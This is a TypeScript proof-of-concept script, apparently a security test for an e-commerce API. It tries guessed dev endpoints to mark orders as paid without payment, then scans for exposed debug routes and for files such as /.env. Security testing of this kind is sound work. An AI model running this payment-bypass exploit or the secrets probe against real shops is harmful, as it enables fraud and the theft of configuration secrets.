/**
 * PoC: Dev Endpoint Exploitation - Free Payment Bypass
 * 
 * VULNERABILITY: completePaymentDevHandler only checks NODE_ENV
 * If misconfigured in production, attacker can mark orders as "paid" for free.
 * 
 * IMPACT: Complete bypass of payment - get products without paying
 * 
 * Run: npx ts-node security-tests/exploit-dev-endpoint.ts
 */

import axios, { AxiosResponse } from 'axios';

// ============================================
// CONFIGURATION
// ============================================
const API_BASE = 'https://api.security-test.site/api/v1';
const SITE_BASE = 'https://api.security-test.site';
const TIMEOUT = 5000;

// Attacker's valid JWT (authenticated user)
const ATTACKER_JWT = 'YOUR_VALID_JWT_TOKEN_HERE';

// ============================================
// HELPER FUNCTIONS  
// ============================================
function isHtmlResponse(response: AxiosResponse): boolean {
  const contentType = response.headers['content-type'] || '';
  const data = typeof response.data === 'string' ? response.data : '';
  return contentType.includes('text/html') || data.includes('<!doctype') || data.includes('<html');
}

function isValidApiResponse(response: AxiosResponse): boolean {
  const contentType = response.headers['content-type'] || '';
  return contentType.includes('application/json');
}

function isSpaFallback(response: AxiosResponse): boolean {
  // SPA returns 200 with HTML for unknown routes
  const data = typeof response.data === 'string' ? response.data : '';
  return response.status === 200 && 
         isHtmlResponse(response) && 
         (data.includes('id="root"') || data.includes('react') || data.includes('vite'));
}

async function exploitDevEndpoint() {
  console.log('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—');
  console.log('â•‘     SECURITY TEST: Dev Endpoint Exploitation             â•‘');
  console.log('â•‘     (Free Payment Bypass)                                â•‘');
  console.log('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');
  
  console.log('âš ï¸  This is for authorized security testing only!\n');
  
  // Step 1: Create a legitimate order
  console.log('[1] Creating a legitimate order...');
  
  let orderId: string | null = null;
  
  try {
    const createResponse = await axios.post(
      `${API_BASE}/payments/create-intent`,
      {
        items: [
          { productId: '507f1f77bcf86cd799439011', quantity: 5 } // Expensive items
        ]
      },
      {
        headers: {
          'Authorization': `Bearer ${ATTACKER_JWT}`,
          'Content-Type': 'application/json'
        }
      }
    );
    
    orderId = createResponse.data?.data?.orderId;
    console.log(`    Order created: ${orderId}`);
    console.log(`    Status: pending (awaiting payment)\n`);
  } catch (error: any) {
    console.log(`    Failed to create order: ${error.response?.data?.message || error.message}`);
    console.log('    Using mock order ID for demonstration...\n');
    orderId = 'mock-order-id-12345';
  }
  
  // Step 2: Try to exploit dev endpoint
  console.log('[2] Attempting to mark order as "paid" via dev endpoint...');
  console.log(`    POST /orders/${orderId}/complete-dev\n`);
  
  // Try multiple potential endpoint patterns
  const devEndpoints = [
    `/orders/${orderId}/complete-dev`,
    `/orders/${orderId}/dev-complete`,
    `/payments/${orderId}/complete-dev`,
    `/dev/orders/${orderId}/complete`,
    `/admin/orders/${orderId}/force-complete`,
  ];
  
  for (const endpoint of devEndpoints) {
    try {
      console.log(`    Trying: POST ${endpoint}`);
      
      const response = await axios.post(
        `${API_BASE}${endpoint}`,
        {},
        {
          headers: {
            'Authorization': `Bearer ${ATTACKER_JWT}`,
            'Content-Type': 'application/json'
          },
          timeout: 5000,
          validateStatus: () => true // Accept any status
        }
      );
      
      if (response.status === 200) {
        console.log('\n    ðŸš¨ CRITICAL VULNERABILITY CONFIRMED!');
        console.log(`    Endpoint ${endpoint} is EXPOSED in production!`);
        console.log(`    Response: ${JSON.stringify(response.data, null, 2)}`);
        console.log('\n    IMPACT:');
        console.log('    - Attacker can mark any order as "paid" without payment');
        console.log('    - Complete e-commerce fraud');
        console.log('    - Unlimited free products');
        
        console.log('\n    REMEDIATION:');
        console.log('    1. Remove this endpoint entirely in production');
        console.log('    2. Use build-time code stripping for dev code');
        console.log('    3. Add admin authentication + audit logging');
        
        return true;
      } else if (response.status === 403) {
        console.log(`    âœ… Blocked (403 Forbidden) - NODE_ENV check working`);
      } else if (response.status === 404) {
        console.log(`    âœ… Not found (404) - Endpoint doesn't exist or is protected`);
      } else {
        console.log(`    Response: ${response.status} - ${response.data?.message || 'Unknown'}`);
      }
    } catch (error: any) {
      console.log(`    Error: ${error.message}`);
    }
  }
  
  console.log('\n[3] Additional checks...');
  
  // Try with different HTTP methods
  const methods = ['PUT', 'PATCH', 'DELETE'];
  for (const method of methods) {
    try {
      const response = await axios.request({
        method,
        url: `${API_BASE}/orders/${orderId}/complete-dev`,
        headers: { 'Authorization': `Bearer ${ATTACKER_JWT}` },
        validateStatus: () => true
      });
      
      if (response.status === 200) {
        console.log(`    ðŸš¨ ${method} method also works!`);
      }
    } catch {}
  }
  
  console.log('\n' + '='.repeat(50));
  console.log('SUMMARY:');
  console.log('='.repeat(50));
  console.log('If all endpoints returned 403/404, the app is likely protected.');
  console.log('However, verify NODE_ENV is correctly set in production config.');
  
  return false;
}

// Check for other dangerous dev/debug endpoints
async function scanForDevEndpoints() {
  console.log('\n\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—');
  console.log('â•‘     BONUS: Scanning for Other Dev/Debug Endpoints        â•‘');
  console.log('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');
  
  const suspiciousEndpoints = [
    { path: '/api/v1/debug', type: 'api' },
    { path: '/api/v1/test', type: 'api' },
    { path: '/api/v1/dev', type: 'api' },
    { path: '/api/v1/health', type: 'api' },  // This should exist but be safe
    { path: '/metrics', type: 'api' },         // Prometheus metrics - may be intentional
    { path: '/.env', type: 'file' },
    { path: '/config.json', type: 'file' },
    { path: '/api-docs', type: 'docs' },
    { path: '/swagger', type: 'docs' },
    { path: '/swagger.json', type: 'docs' },
    { path: '/graphql', type: 'api' },
  ];
  
  console.log('Scanning for exposed dev/debug endpoints...\n');
  console.log('Note: SPA apps return 200 for all routes (frontend fallback).');
  console.log('Only JSON API responses are considered "truly exposed".\n');
  
  const exposed: string[] = [];
  const spaFallbacks: string[] = [];
  
  for (const endpoint of suspiciousEndpoints) {
    try {
      const response = await axios.get(
        `${SITE_BASE}${endpoint.path}`,
        {
          headers: { 'Accept': 'application/json' },
          timeout: TIMEOUT,
          validateStatus: () => true
        }
      );
      
      // Check if it's just SPA returning HTML for unknown routes
      if (isSpaFallback(response)) {
        spaFallbacks.push(endpoint.path);
        console.log(`  ðŸ“„ ${endpoint.path} - SPA fallback (HTML)`);
        continue;
      }
      
      if (response.status === 200 && isValidApiResponse(response)) {
        console.log(`  ðŸš¨ ${endpoint.path} - EXPOSED (JSON API)`);
        exposed.push(endpoint.path);
      } else if (response.status === 401 || response.status === 403) {
        console.log(`  ðŸ”’ ${endpoint.path} - Protected (${response.status})`);
      } else if (response.status === 404) {
        console.log(`  âœ… ${endpoint.path} - Not found (404)`);
      } else {
        console.log(`  â“ ${endpoint.path} - Status ${response.status}`);
      }
    } catch (error: any) {
      console.log(`  âš ï¸ ${endpoint.path} - Error: ${error.message}`);
    }
  }
  
  console.log('\n' + 'â”€'.repeat(50));
  console.log('RESULTS:');
  console.log('â”€'.repeat(50));
  
  if (exposed.length > 0) {
    console.log('\nðŸš¨ TRULY EXPOSED endpoints (returning JSON):');
    exposed.forEach(e => console.log(`   - ${e}`));
  } else {
    console.log('\nâœ… No dangerous endpoints found exposed');
  }
  
  if (spaFallbacks.length > 0) {
    console.log(`\nðŸ“„ ${spaFallbacks.length} routes returned SPA HTML (not real endpoints)`);
  }
}

async function main() {
  await exploitDevEndpoint();
  await scanForDevEndpoints();
}

main().catch(console.error);
